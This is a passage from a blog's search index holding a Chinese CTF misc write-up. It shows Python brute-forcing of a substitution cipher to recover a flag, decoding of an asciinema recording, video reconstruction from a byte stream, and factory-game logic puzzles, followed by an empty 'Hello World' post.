class="line"></span><br><span class="line">def check_equals(flag,left, right):</span><br><span class="line">    # check whether left == right or not</span><br><span class="line">    if left == right: print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_data(input_codes):</span><br><span class="line">    # retriev th decrypted data</span><br><span class="line"></span><br><span class="line">    output_chars = [cod_dict[c] for c in input_codes]</span><br><span class="line">    return &#x27;&#x27;.join(output_chars)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # check som obvious things</span><br><span class="line">    # check th flag</span><br><span class="line">    flags = []</span><br><span class="line">    for i in range(len(strs1)):</span><br><span class="line">        for j in range(len(strs2)):</span><br><span class="line">            for k in range(len(strs3)):</span><br><span class="line">                for d in range(len(strs4)):</span><br><span class="line">                    for m in range(len(strs5)):</span><br><span class="line">                        cod_dict = []</span><br><span class="line">                        cod_dict += strs1[i]</span><br><span class="line">                        cod_dict += strs2[j]</span><br><span class="line">                        cod_dict += strs3[k]</span><br><span class="line">                        cod_dict += strs4[d]</span><br><span class="line">                        cod_dict += strs5[m] </span><br><span class="line">                        tttttt = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90,</span><br><span class="line">                                            17, 118, 36, 25, 13, 89, 90, 3, 63, 25,</span><br><span class="line">                                            31, 77, 27, 60, 3, 118, 24, 62, 54, 61,</span><br><span class="line">                                            25, 63, 77, 36, 5, 32, 60, 67, 113, 28]</span><br><span class="line">                        </span><br><span class="line">                        output_chars = [cod_dict[c] for c in tttttt]</span><br><span class="line">                        flag = &#x27;&#x27;.join(output_chars)</span><br><span class="line">                        </span><br><span class="line">                        if flag not in flags:</span><br><span class="line">                            if &#x27;flag&#123;&#x27; in flag and &#x27;&#125;&#x27; in flag:</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;flag&#123;&#x27;), 0)</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;&#125;&#x27;), len(flag) - 1)</span><br><span class="line">                                flags.append(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;nou-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br></pre></td></tr></table></figure><p>这里调后面的即可</p><h2 id="高频率星球"><a class="markdownIt-Anchor" href="#高频率星球">#</a> <strong>高频率星球</strong></h2><p>我还专门下载了 asciinema（只能再 linux 上使用），这题主要是解码 json 再删去记录的相应的操作字符即可，直接 python 提取 json 内容再转到 notepad++ 上替换操作字符串。</p><p>另外 windows 直接改后缀无法打开（菜我不知道为什么，还以为自己没替换好），必须在 linux 下 Node flag.js 才可。</p><h2 id="流式星球"><a class="markdownIt-Anchor" href="#流式星球">#</a> <strong>流式星球</strong></h2><p>这题先跟着视频如何转换为字节流的代码反向写一个字节流转换为视频的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def bin_to_video(bin_file, output_video, frame_width=1280, frame_height=640):</span><br><span class="line">   </span><br><span class="line">    buffer = np.fromfile(bin_file, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    frame_count = len(buffer) // (frame_width * frame_height * 3)</span><br><span class="line"></span><br><span class="line">    reshaped_buffer = buffer[:frame_count * frame_width * frame_height * 3]</span><br><span class="line">    reshaped_buffer = reshaped_buffer.reshape((frame_count, frame_height, frame_width, 3))</span><br><span class="line"></span><br><span class="line">    fourcc = cv2.VideoWriter_fourcc(*&#x27;mp4v&#x27;)</span><br><span class="line">    out = cv2.VideoWriter(output_video, fourcc, 30.0, (frame_width, frame_height))</span><br><span class="line"></span><br><span class="line">    for i in range(frame_count):</span><br><span class="line">        out.write(reshaped_buffer[i])</span><br><span class="line"></span><br><span class="line">    out.release()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    bin_to_video(&quot;video.bin&quot;, &quot;deo.mp4&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现能模糊的看到 BangDream 几个字，之后去 B 站搜索了下，并找到相应的原视频（原视频为 360*640，改了一下 frame_width 和 frame_height，发现视频更加模糊），自己用题目给出的转化代码转换原视频，再自己手动测试，发现规律，在 frame_width 正确的情况下，frame_height 如何改变，视频只会出详上下移动的效果，而 frame_width 错误则视频极有可能十分模糊。直接上暴力，暴力 frame_width 直到找到正确的答案。似乎是 346. 之后就能得到清晰的视频</p><h2 id="异星歧途"><a class="markdownIt-Anchor" href="#异星歧途">#</a> <strong>异星歧途</strong></h2><p>主要是了解游戏机制，观看游戏里逻辑控制器的指令。第一个二进制序列很简单，照着打就行。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2.png?raw=true" alt="图片"><br>第二个指令需要进行运算，指令给出 sw1-8 组成了 number,number == fl0 时能够运行，fl0 只能为数的平方，且 SW1 = SW6 = 1，直接一步步试一下就行。 第三个指令序列需要看游戏机制，在满足反应堆冷却液充足的情况下打开传送带开关即可。第四个指令序列也要了解游戏机制中焚化炉的作用，合理关闭烧毁发电材料的焚化炉即可。（此游戏让我想到了异星工厂，另一款非常好的传送带工厂游戏）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/10/hello-world/"/>
      <url>/2023/11/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>This is the start!</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
